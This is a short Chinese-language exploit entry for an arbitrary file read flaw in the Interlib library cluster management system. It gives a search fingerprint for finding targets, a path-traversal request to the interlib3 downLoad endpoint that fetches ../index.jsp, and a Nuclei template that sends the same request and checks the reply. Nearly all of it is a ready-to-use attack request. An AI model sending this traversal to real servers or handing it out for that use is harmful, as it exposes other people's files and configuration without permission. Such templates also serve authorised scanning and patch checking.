# Interlib图书馆集群管理系统interlib3任意文件读取漏洞

Interlib ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="interlib/common/"`
- **请求**：`http://IP/interlib3/downLoad?file=../index.jsp`

**Payload**
```
Nuclei验证
id: interlib3-downLoadfile
info:
name: interlib3-downLoadfile
author: web
severity: high
tags: interlib3-downLoadfile
requests:
- method: GET
path:
- "{{BaseURL}}/interlib3/downLoad?file=../index.jsp"
stop-at-first-match: true
matchers-condition: and
matchers:
- type: regex
regex:
- "navigator"
condition: or
- type: status
status:
- 200
```